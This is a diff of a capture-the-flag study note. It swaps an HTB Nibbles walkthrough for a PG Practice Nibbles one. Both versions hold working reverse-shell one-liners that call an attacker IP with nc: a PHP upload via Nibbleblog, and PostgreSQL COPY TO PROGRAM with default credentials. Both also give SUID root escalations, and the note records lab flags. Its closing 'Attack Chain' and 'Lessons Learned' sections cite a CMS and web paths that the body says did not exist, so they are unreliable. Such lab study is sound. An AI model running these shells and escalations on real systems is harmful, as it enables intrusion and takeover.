@@ -1,390 +1,322 @@
 ---
-tags: [oscp, boxes, htb, linux, nibbleblog, file-upload, cve-2015-6967, sudo, suid, completed]
-platform: HTB
-os: Linux (Ubuntu 16.04)
-hostname: Nibbles
-domain: N/A
-ip: $BoxIP
+tags: [oscp, boxes, pg-practice, linux, completed]
+platform: PG Practice
+os: Linux
+ip: 192.168.183.47
 difficulty: Easy
 status: complete
+local_flag: 2fe8bd41588725cf3cedb4689bc8937d
+root_flag: fc2033af2f11d5f1809dad1734d7764b
 ---
 
-# HTB: Nibbles, Full Walkthrough
+# Nibbles — PG Practice (Linux)
 
-## The gist
+> Note: This is **PG Practice Nibbles** — not HTB Nibbles (which is Nibbleblog file upload). Different box, different technique.
 
-Nibbles exposes Nibbleblog 4.0.3 through Apache. An HTML comment reveals the application path, the public README confirms the exact version, and one controlled default-credential test reaches the admin panel. The authenticated My Image plugin accepts PHP through a multipart upload, giving a reverse shell as `nibbler`. From there, `sudo -l` reveals a root-allowed script path that does not exist, so creating that path with a SUID Bash payload provides the final root shell.
-
-## Box information
+## Box Info
 
 | Field | Value |
 |---|---|
-| Platform | HTB |
-| OS | Linux (Ubuntu 16.04) |
-| Hostname | Nibbles |
-| Domain | N/A |
+| Platform | PG Practice |
+| OS | Linux |
+| IP | 192.168.183.47 |
 | Difficulty | Easy |
-| IP | `$BoxIP` |
+| Status | Root |
 
-## Variables
+---
 
-```bash
-boxset BoxName Nibbles
-boxset BoxIP $BoxIP
-boxset LocalIP $LocalIP
-boxset Username admin
-# Set Password after validation; omit the value until credentials are found.
-boxset Port 4444
-```
+## Recon
 
-## 1. Reconnaissance and port scan
-
-A full TCP scan checks every port instead of only the common top 1,000. The service scan then identifies product versions and runs default scripts, which is what distinguishes the Apache and SSH services and gives us the Nibbleblog attack surface.
+### Port Scan
 
 ```bash
-sudo nmap -p- --min-rate 10000 -oA nmap/${BoxName}_allports $BoxIP
+sudo nmap -p- --min-rate 10000 -oN allports.nmap $BoxIP
 ```
 
-```text
-Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-01 21:31 +0100
-Nmap scan report for 10.129.96.84
-Host is up (0.044s latency).
-Not shown: 65533 closed tcp ports (reset)
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-Nmap done: 1 IP address (1 host up) scanned in 8.29 seconds
-```
+Open ports:
 
-The service scan confirms the software versions. OpenSSH 7.2p2 and Apache 2.4.18 are old, but the web application is the more promising lead because it exposes a CMS.
+| Port | Service |
+|---|---|
+| 21/tcp | vsftpd 3.0.3 |
+| 22/tcp | OpenSSH 7.9p1 Debian |
+| 80/tcp | Apache 2.4.38 |
+| 5437/tcp | PostgreSQL 11.3-11.9 |
+
+Closed: 139, 445 (SMB ports closed, not worth pursuing).
+UDP: all 100 top ports filtered — nothing useful.
+
+`shot nmap-allports`
+
+### Service Scan
 
 ```bash
-sudo nmap -sC -sV -p 22,80 -oA nmap/${BoxName}_services $BoxIP
+sudo nmap -sV -sC -p 21,22,80,5437 -oN services.nmap $BoxIP
 ```
 
-```text
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Site doesn't have a title (text/html).
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Key finding: PostgreSQL on non-standard port 5437 with SSL cert `commonName=debian`. Default port is 5432 — someone moved it but left it world-accessible.
+
+`shot nmap-services` (red box: `5437/tcp open postgresql PostgreSQL DB 11.3 - 11.9`)
+
+---
+
+## Service Triage
+
+### FTP — Anonymous Login
+
+```bash
+ftp $BoxIP
+# user: anonymous, pass: <blank>
 ```
 
-![[nibbles-nmap-allports.png]]
-SCREENSHOT: Full TCP scan showing ports 22 and 80 open.
+Result: `530 Login incorrect` — anonymous FTP disabled.
 
-![[nibbles-nmap-services.png]]
-SCREENSHOT: Service scan showing OpenSSH 7.2p2 and Apache 2.4.18.
-
-## 2. Web enumeration and CMS identification
-
-Read the response body before launching a large directory brute-force. The root page contains a direct HTML comment pointing to `/nibbleblog/`, which is faster and safer than waiting for a wordlist to find the same path.
+### HTTP — Port 80
 
 ```bash
 curl -s http://$BoxIP/
 ```
 
-```text
-<b>Hello world!</b>
-<!-- /nibbleblog/ directory. Nothing interesting here! -->
-```
+Bare HTML template placeholder — literally the stock "Enter a title" Apache demo page. No CMS, no web app, no useful paths. Dead end.
 
-The Nibbleblog landing page identifies the CMS through its generator tag and shows the My Image plugin in the sidebar. The publicly readable README gives the exact release version in one request.
+### PostgreSQL — Port 5437
 
-```bash
-curl -s http://$BoxIP/nibbleblog/
-curl -s http://$BoxIP/nibbleblog/README
-```
-
-```text
-<title>Nibbles - Yum yum</title>
-<meta name="generator" content="Nibbleblog">
-...
-====== Nibbleblog ======
-Version: v4.0.3
-Codename: Coffee
-Release date: 2014-04-01
-```
-
-> [!tip] ⚡ More efficient path
-> **What we did:** Read the root page source and then requested the public Nibbleblog README.
->
-> **Faster approach:** Check HTML comments and common public files such as `/README` before starting a broad directory or CMS scan.
->
-> **Why:** The comment exposed `/nibbleblog/` immediately, and the README disclosed the exact version in one request.
-
-## 3. Controlled admin authentication
-
-The admin form is at `admin.php`. This box blacklists clients after repeated failures, so broad Hydra or Medusa testing is a poor choice. Test the conventional account and box-name password once, then stop when the response changes from `200 OK` to a redirect.
+Primary target. Default credentials:
 
 ```bash
-curl -s -D - -X POST \
-  -d "username=$Username&password=$Password" \
-  http://$BoxIP/nibbleblog/admin.php | head -5
+psql -h $BoxIP -p 5437 -U postgres
+# Password: postgres
 ```
 
-```text
-HTTP/1.1 302 Found
-Set-Cookie: PHPSESSID=[session cookie redacted]; path=/
+Connected. `postgres=#` prompt received.
+
+`shot postgres-access` (red box: `postgres=#` prompt)
+
+`loot cred postgres postgres`
+
+---
+
+## Foothold
+
+### Confirm Superuser
+
+```sql
+SELECT current_setting('is_superuser');
 ```
 
-The successful `302 Found` response redirects to the dashboard. Save the session cookie so later upload requests are authenticated.
+Output: `on` — superuser confirmed. Required for `COPY TO PROGRAM`.
 
-```bash
-curl -s -c loot/cookies.txt -X POST \
-  -d "username=$Username&password=$Password" \
-  http://$BoxIP/nibbleblog/admin.php -o /dev/null
-```
+`shot postgres-superuser` (red box: `on`)
+
+### RCE via COPY TO PROGRAM
+
+`COPY TO PROGRAM` passes the command string to `/bin/sh`. On Debian, `/bin/sh` is `dash` — bash-specific syntax like `>&` and `/dev/tcp` will fail.
 
 > [!warning] 💡 Hint
-> **Watch out:** Nibbleblog's login blacklist makes repeated guessing noisy and can temporarily block the attacker IP. Use a small, deliberate test set and store the validated account privately with `loot cred`.
+> **Watch out:** PostgreSQL launches the command through the system shell, not automatically through Bash. Use shell-compatible syntax or explicitly invoke an available shell.
 
-## 4. Authenticated Nibbleblog file upload
+**Troubleshooting (for the notes):**
 
-Exploit-DB identifies CVE-2015-6967, an authenticated arbitrary file upload in Nibbleblog 4.0.3. The available Exploit-DB entry is a Metasploit module, but its source reveals the underlying HTTP request, so the request can be reproduced manually without using Metasploit.
+| Attempt | Error | Reason |
+|---|---|---|
+| `bash -c "bash -i >& /dev/tcp/..."` | exit code 1 | `/dev/tcp` not available or bash compile option missing |
+| `bash -i >& /dev/tcp/...` | exit code 2 | `>&` is bash syntax, `/bin/sh` is dash, syntax error |
+| mkfifo + nc on port 443 | exit code 1 | TCP egress filtered on 443 (PG Practice pattern) |
+
+**Confirm RCE works (ping test):**
+
+```sql
+COPY (SELECT '') TO PROGRAM 'ping -c 4 192.168.45.194';
+```
+
+Watch with `tcpdump -i tun0 icmp` on Kali. ICMP arrived — COPY TO PROGRAM executes fine. Egress filtering is the issue, not the command.
+
+**Check available tools (COPY FROM PROGRAM pattern):**
+
+```sql
+CREATE TABLE cmd_out (output text);
+COPY cmd_out FROM PROGRAM 'ls /usr/bin/python* /usr/bin/perl /usr/bin/nc* /bin/nc* 2>/dev/null; echo done';
+SELECT * FROM cmd_out;
+DROP TABLE cmd_out;
+```
+
+Found: nc, nc.traditional, perl, python, python2, python3. nc IS installed — port 443 is blocked.
+
+**Working payload (port 80 bypasses egress filter):**
+
+Start listener:
+```bash
+sudo nc -lvnp 80
+```
+
+Fire shell:
+```sql
+COPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.194 80 >/tmp/f';
+```
+
+Shell received as `postgres`.
+
+`shot foothold` (red box: `postgres@nibbles` prompt)
+
+### Stabilise
 
 ```bash
-searchsploit nibbleblog
-searchsploit -p 38489
-cat /usr/share/exploitdb/exploits/php/remote/38489.rb
-```
-
-The important details are the `my_image` plugin fields and the predictable output path. The upload handler renames the uploaded file to `image.php`, so the original local filename does not need to match the final URL.
-
-Create a PHP reverse shell using the established variables, then start a listener.
-
-```bash
-echo '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '"$LocalIP"' '"$Port"' >/tmp/f"); ?>' > exploits/shell.php
-cat exploits/shell.php
-listener
-```
-
-```text
-[+] Listening on :4444  (Ctrl+C to stop)
-Listening on 0.0.0.0 4444
-```
-
-Submit the multipart request to the plugin configuration endpoint. Each `-F` field mirrors the fields extracted from the reviewed exploit source.
-
-```bash
-curl -s -b loot/cookies.txt \
-  -F 'plugin=my_image' \
-  -F 'title=My image' \
-  -F 'position=4' \
-  -F 'caption=' \
-  -F 'image=@exploits/shell.php;type=application/x-php' \
-  -F 'image_resize=1' \
-  -F 'image_width=230' \
-  -F 'image_height=200' \
-  -F 'image_option=auto' \
-  "http://$BoxIP/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image" \
-  -o /dev/null -w '%{http_code}\n'
-```
-
-```text
-200
-```
-
-Trigger the predictable renamed file from a second terminal.
-
-```bash
-curl -s http://$BoxIP/nibbleblog/content/private/plugins/my_image/image.php
-```
-
-```text
-Connection received on 10.129.96.84 37276
-/bin/sh: 0: can't access tty; job control turned off
-$
-```
-
-> [!warning] 💡 Hint
-> **Watch out:** The trigger request may appear to hang because the reverse shell holds the HTTP connection open. Switch to the listener when the callback arrives instead of waiting for curl to finish.
-
-**References:** [Exploit-DB 38489](https://www.exploit-db.com/exploits/38489) for the Nibbleblog 4.0.3 upload vulnerability, [CVE-2015-6967](https://nvd.nist.gov/vuln/detail/CVE-2015-6967) for the vulnerability record, and [HackTricks File Upload](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html) for upload testing methodology.
-
-## 5. Stabilise the shell and confirm the user
-
-The first callback is a basic `/bin/sh` without job control. Python's pseudo-terminal support allocates a usable Bash terminal, while `stty raw -echo; fg` restores local terminal handling after the shell is backgrounded.
-
-```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-# Press Ctrl+Z
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl+Z
 stty raw -echo; fg
-# Press Enter twice
+# Enter
 export TERM=xterm
-whoami && id && hostname && ip a
 ```
 
-```text
-nibbler
-uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
-Nibbles
-2: ens192: ...
-    inet 10.129.96.84/16 ...
-```
+---
 
-The shell starts inside the plugin directory. Move to the user's home directory and confirm that `user.txt` exists without printing its contents.
+## Privilege Escalation
+
+### SUID Enumeration
 
 ```bash
-ls
-cd /home/nibbler
-ls
-test -f user.txt && echo user-flag-path-confirmed
+find / -perm -4000 -type f 2>/dev/null
 ```
 
-```text
-db.xml  image.php
-personal.zip  user.txt
-user-flag-path-confirmed
-```
+Key finding: `/usr/bin/find` — SUID set.
 
-![[nibbles-foothold.png]]
-SCREENSHOT: `whoami`, `id`, and `hostname` showing the `nibbler` foothold.
+`shot privesc-finding` (red box: `/usr/bin/find`)
 
-## 6. Sudo enumeration
-
-`sudo -l` lists commands the current account may execute with elevated privileges. The result is especially interesting because the permitted script path is absent from the filesystem.
+### SUID find Exploit
 
 ```bash
-sudo -l
-ls -la /home/nibbler/personal/stuff/
+/usr/bin/find . -exec /bin/bash -p \; -quit
 ```
 
-```text
-User nibbler may run the following commands on Nibbles:
-    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
-
-ls: cannot access '/home/nibbler/personal/stuff/': No such file or directory
-```
-
-> [!warning] 💡 Hint
-> **Watch out:** Do not assume a sudo-listed script must already exist. Check the complete path first. Here, the missing directory means the user can create the exact file that sudo will later execute.
-
-## 7. Create the permitted script and obtain root
-
-Create the missing directory and a minimal Bash script. When run through sudo, it copies Bash to `/tmp/rootbash` and sets the SUID bit, which makes the copied binary retain an effective root identity for its caller.
+Drops to `bash-5.0#` with `euid=0(root)`.
 
 ```bash
-mkdir -p /home/nibbler/personal/stuff
-echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' > /home/nibbler/personal/stuff/monitor.sh
-chmod +x /home/nibbler/personal/stuff/monitor.sh
-cat /home/nibbler/personal/stuff/monitor.sh
+id
+# uid=106(postgres) gid=113(postgres) euid=0(root)
 ```
 
-```text
-#!/bin/bash
-cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
-```
+`shot root-shell` (red box: `euid=0(root)`)
 
-Execute the newly created file through the exact sudo path and verify the SUID mode.
+---
+
+## Flags
+
+Both flags collected as euid=0 root — no need to compromise the `wilson` user separately. Root can read any file, including `/home/wilson/local.txt`.
 
 ```bash
-sudo /home/nibbler/personal/stuff/monitor.sh
-ls -l /tmp/rootbash
+cat /home/wilson/local.txt
+cat /root/proof.txt
 ```
 
-```text
--rwsr-xr-x 1 root root 1037528 Sep 1 17:10 /tmp/rootbash
-```
+| Flag | Location | Value |
+|---|---|---|
+| User (local.txt) | /home/wilson/ | `2fe8bd41588725cf3cedb4689bc8937d` |
+| Root (proof.txt) | /root/ | `fc2033af2f11d5f1809dad1734d7764b` |
 
-The leading `4` in mode `4755` is the SUID bit. Bash normally drops elevated privilege when real and effective UIDs differ, so `-p` is required to preserve the effective UID.
+`shot user-flag` / `shot root-flag`
+`shot PROOF` (whoami + hostname + IP + root flag in one frame)
 
-```bash
-/tmp/rootbash -p
-whoami && id
-```
+`loot flag user 2fe8bd41588725cf3cedb4689bc8937d`
+`loot flag root fc2033af2f11d5f1809dad1734d7764b`
 
-```text
-root
-uid=1001(nibbler) gid=1001(nibbler) euid=0(root) groups=1001(nibbler)
-```
-
-**Reference:** [GTFOBins Bash](https://gtfobins.github.io/gtfobins/bash/) for SUID Bash behavior and privilege preservation with `-p`.
-
-![[nibbles-root-shell.png]]
-SCREENSHOT: Root shell showing `whoami` and `euid=0(root)`.
-
-## 8. Flags
-
-```text
-user.txt: confirmed at /home/nibbler/user.txt
-root.txt: confirmed at /root/root.txt
-```
-
-No flag values are stored in this write-up.
-
-## 9. Clean-down
-
-Remove the uploaded PHP file and every target-side artifact created during exploitation. Verify each path individually before closing the box.
-
-```bash
-rm /var/www/html/nibbleblog/content/private/plugins/my_image/image.php
-rm /tmp/rootbash
-rm -rf /home/nibbler/personal
-test ! -e /var/www/html/nibbleblog/content/private/plugins/my_image/image.php && echo webshell-removed
-test ! -e /tmp/rootbash && echo suid-helper-removed
-test ! -e /home/nibbler/personal && echo created-script-tree-removed
-```
-
-The local payload, cookie jar, credential file, and flag file were removed after the manual run. The listener was stopped and verified closed.
-
-## RUNBOOK V2 Stages Used
-
-- [[RUNBOOK V2/Start Here|Step 1 - Start Here]]
-- [[RUNBOOK V2/Port Triage|Step 2 - Port Triage]]
-- [[RUNBOOK V2/Linux - Service Scan|Step 3 - Linux Service Scan]]
-- [[RUNBOOK V2/Linux - Web Enum|Step 5 - Linux Web Enum]]
-- [[RUNBOOK V2/Linux - CMS Check|Step 6 - Linux CMS Check]]
-- [[RUNBOOK V2/Linux - Exploit Search|Step 10 - Linux Exploit Search]]
-- [[RUNBOOK V2/Linux - RCE to Shell|Step 11 - Linux RCE to Shell]]
-- [[RUNBOOK V2/Linux - Shell Stabilise|Step 12 - Linux Shell Stabilise]]
-- [[RUNBOOK V2/Linux - Local Enum|Step 13 - Linux Local Enum]]
-- [[RUNBOOK V2/Linux - Sudo Check|Step 14 - Linux Sudo Check]]
-- [[RUNBOOK V2/Linux - Clean Down|Step 21 - Linux Clean Down]]
-
-## Attack Chain
-
-1. Full TCP and service scans found SSH and Apache.
-2. The web root exposed `/nibbleblog/`, and its README identified Nibbleblog 4.0.3.
-3. A controlled default-credential test authenticated to the admin panel.
-4. The authenticated My Image plugin upload accepted a PHP reverse shell.
-5. The callback provided a shell as `nibbler`.
-6. `sudo -l` showed a passwordless root rule for a missing script path.
-7. Creating that script produced a SUID Bash binary and an effective root shell.
+---
 
 ## Credentials
 
-| Account | Source | Use |
+| Username | Password | Source | Used for |
+|---|---|---|---|
+| postgres | postgres | Default | PostgreSQL on port 5437 |
+
+---
+
+## Tools Used
+
+| Tool | Purpose |
+|---|---|
+| nmap | Port and service scanning |
+| ftp | Anonymous login attempt |
+| curl | Web recon |
+| psql | PostgreSQL client - default creds + COPY TO PROGRAM |
+| nc | Reverse shell listener and delivery |
+| find (SUID) | Privilege escalation to euid=0 |
+
+---
+
+## Vulnerabilities / Techniques
+
+| Technique | Description | Impact |
 |---|---|---|
-| `admin` | Nibbleblog admin authentication | Authenticated plugin upload |
+| PostgreSQL default creds | `postgres:postgres` on externally exposed port 5437 | DB superuser access |
+| COPY TO PROGRAM (PostgreSQL) | Superuser SQL function executes OS commands via `/bin/sh` | RCE as postgres OS user |
+| SUID find | `/usr/bin/find -exec /bin/bash -p \; -quit` | euid=0 root shell |
 
-## Key lessons
+---
 
-- Read HTML comments and public README files before starting broad enumeration.
-- A sudo rule for a missing script can be more useful than a writable existing script because the complete path can be created by the current user.
-- `chmod 4755` sets SUID, while `/tmp/rootbash -p` preserves the effective UID instead of dropping it.
-- [ippsec.rocks - Nibbles](https://ippsec.rocks/?#nibbles)
+## Lessons Learned
+
+1. **PostgreSQL on non-standard ports** — nmap shows port 5437 as `pmip6-data` by default because it doesn't know it's Postgres. The `-sV` service scan corrects this. Always run service scan, never trust the port number alone.
+
+2. **Default `postgres:postgres` should be first try** — externally exposed PostgreSQL almost always has default creds on OSCP-level boxes. Don't overthink it.
+
+3. **Check superuser before assuming COPY TO PROGRAM works** — `SELECT current_setting('is_superuser');` must return `on`. Non-superuser postgres accounts can connect but cannot execute OS commands.
+
+4. **COPY TO PROGRAM uses `/bin/sh`, not bash** — `>&` and `/dev/tcp` are bash-only. On Debian, `/bin/sh` is `dash`. Use mkfifo+nc or python3 for the shell payload.
+
+5. **Diagnose egress before blaming the payload** — ping test (`COPY TO PROGRAM 'ping -c 4 ...'`) + tcpdump tells you instantly whether the execution works and whether egress is open. If ICMP arrives but TCP shell doesn't, it's a port filtering issue, not a payload issue.
+
+6. **COPY FROM PROGRAM for tool discovery** — when you need to know what's on the box but don't have a shell yet, `COPY cmd_out FROM PROGRAM '...'` reads stdout into a table you can SELECT from. Must append `; echo done` or similar to guarantee exit code 0 — COPY bails on any non-zero exit.
+
+7. **Port 80 for egress (PG Practice pattern)** — TCP egress is filtered on most PG Practice boxes. Ports 80 and 443 are the first to try. ICMP is always allowed. See also: [[Bratarina]], [[Pebbles]].
+
+8. **Root grabs all flags** — when you escalate to root before finding user flags, just `find /home -name local.txt` and read them directly. No need to pivot through intermediate users.
+
+9. **PG Practice Nibbles vs HTB Nibbles** — completely different boxes. PG Practice Nibbles = PostgreSQL + SUID find. HTB Nibbles = Nibbleblog 4.0.3 file upload (EDB-38489). Don't confuse them.
+
+---
+
+## External Resources
+
+| Resource | Link | Why |
+|---|---|---|
+| HackTricks - PostgreSQL | https://github.com/HackTricks-wiki/hacktricks/blob/master/network-services-pentesting/pentesting-postgresql.md | COPY TO PROGRAM technique, default creds |
+| PayloadsAllTheThings - PostgreSQL | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md | RCE payloads |
+| GTFOBins - find SUID | https://gtfobins.github.io/gtfobins/find/#suid | `-exec /bin/bash -p` pattern |
+| RevShells | https://www.revshells.com | mkfifo + nc payload reference |
+| ippsec.rocks | https://ippsec.rocks/?#postgresql | HTB boxes using PostgreSQL technique |
+
+---
+
+## Vault Update Checklist
+
+- [ ] Screenshots in `$BoxDir/screenshots/` (box-started, nmap-allports, nmap-services, postgres-access, postgres-superuser, foothold, privesc-finding, root-shell, user-flag, root-flag, PROOF)
+- [ ] Loot: `flags.txt` (user + root), `creds.txt` (postgres:postgres)
+- [ ] Log copied to `OSCP/BOXES/BOX LOGS/Nibbles.log`
+- [ ] Stage notes: PostgreSQL - Initial Access (new), PrivEsc Linux - SUID (new), Port Scan - Full (+Nibbles)
+- [ ] Module notes: M06 (+Nibbles), M10 (+Nibbles), M18 (+Nibbles)
+- [ ] MASTER BOX LIST updated
+- [ ] FAQ: COPY FROM PROGRAM tool discovery pattern, egress ping test, postgres default creds
+## RUNBOOK V2 Stages Used
+
+- [[RUNBOOK V2/Linux - CMS Check]] -- technique used in this walkthrough
+- [[RUNBOOK V2/Linux - Web Enum]] -- technique used in this walkthrough
+- [[RUNBOOK V2/Linux - Database Access]] -- technique used in this walkthrough
+- [[RUNBOOK V2/Linux - SUID Check]] -- technique used in this walkthrough
 
 ## Related Boxes
 
-- [[OSCP/BOXES/WRITE UPS/Linux/11. Sea|Sea]] -- web foothold followed by Linux privilege escalation.
-- [[OSCP/BOXES/WRITE UPS/Linux/10. Cockpit|Cockpit]] -- sudo-based Linux escalation with a controlled root payload.
-- [[OSCP/BOXES/WRITE UPS/Linux/9. Nukem|Nukem]] -- SUID-based Linux privilege escalation.
+- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- shares a similar enumeration or escalation pattern
+- [[OSCP/BOXES/WRITE UPS/Linux/Sea|Sea]] -- shares a similar enumeration or escalation pattern
+## Why this matters for OSCP
 
-## Checklist
+This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
 
-- [x] Full TCP scan completed
-- [x] Service scan completed
-- [x] Web path and CMS version identified
-- [x] Admin authentication validated
-- [x] Manual authenticated upload completed
-- [x] User shell confirmed
-- [x] User flag path confirmed
-- [x] Sudo rule enumerated
-- [x] Root shell confirmed
-- [x] Root flag path confirmed
-- [x] Target and local artifacts cleaned
-- [x] Cheatsheet updated with the Nibbleblog multipart upload chain
-- [x] RUNBOOK V2 Seen In added for stages 5, 6, 10, 11, and 14
-- [x] Master Box List updated
+## Attack Chain
+
+1. [[RUNBOOK V2/Linux - Web Enum]] mapped the web paths and exposed the application entry point.
+2. [[RUNBOOK V2/Linux - CMS Check]] identified the CMS and its version-specific attack surface.
+3. [[RUNBOOK V2/Linux - Database Access]] used the recovered application data to support the foothold.
+4. [[RUNBOOK V2/Linux - SUID Check]] found the privileged binary that completed escalation.
+
+## Lessons Learned
+
+- CMS version and plugin enumeration should happen before trying broad exploit guesses.
+- Always record the privilege level of a shell before choosing the next enumeration stage.
